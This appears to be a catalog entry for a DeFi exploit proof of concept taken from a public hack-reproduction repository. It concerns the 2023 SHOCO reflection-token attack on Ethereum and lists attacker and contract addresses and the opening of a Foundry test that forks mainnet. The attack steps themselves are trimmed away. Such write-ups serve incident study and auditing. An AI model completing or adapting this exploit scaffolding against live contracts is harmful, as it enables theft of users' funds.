# [?] - SHOCO - Reflection token

## Summary
Severity: Unknown
Chain: Ethereum
Component: SHOCO
Published: 2023-01-19
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-01/SHOCO_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~4ETH
References:
- https://github.com/Autosaida/DeFiHackAnalysis/blob/master/analysis/230119_SHOCO.md

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~4 ETH
// Original Attacker: https://etherscan.io/address/0x14d8ada7a0ba91f59dc0cb97c8f44f1d177c2195
// Frontrunner: https://etherscan.io/address/0xe71aca93c0e0721f8250d2d0e4f883aa1c020361
// Original Attack Contract: https://etherscan.io/address/0x15d684b4ecdc0ece8bc9aec6bce3398a9a4c7611
// Vulnerable Contract: https://etherscan.io/address/0x31a4f372aa891b46ba44dc64be1d8947c889e9c6
// Attack Tx: https://etherscan.io/tx/0x2e832f044b4a0a0b8d38166fe4d781ab330b05b9efa9e72a7a0895f1b984084b

// @Analysis
// https://github.com/Autosaida/DeFiHackAnalysis/blob/master/analysis/230119_SHOCO.md

interface IReflection is IERC20 {
    function deliver(
        uint256 amount
    ) external;
    function tokenFromReflection(
        uint256 rAmount
    ) external view returns (uint256);
}

contract SHOCOAttacker is Test {
    IUniswapV2Pair shoco_weth = IUniswapV2Pair(0x806b6C6819b1f62Ca4B66658b669f0A98e385D18);
    IReflection shoco = IReflection(0x31A4F372AA891B46bA44dC64Be1d8947c889E9c6);
    IERC20 weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    function setUp() public {
        vm.createSelectFork("mainnet");

```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-01/SHOCO_exp.sol_
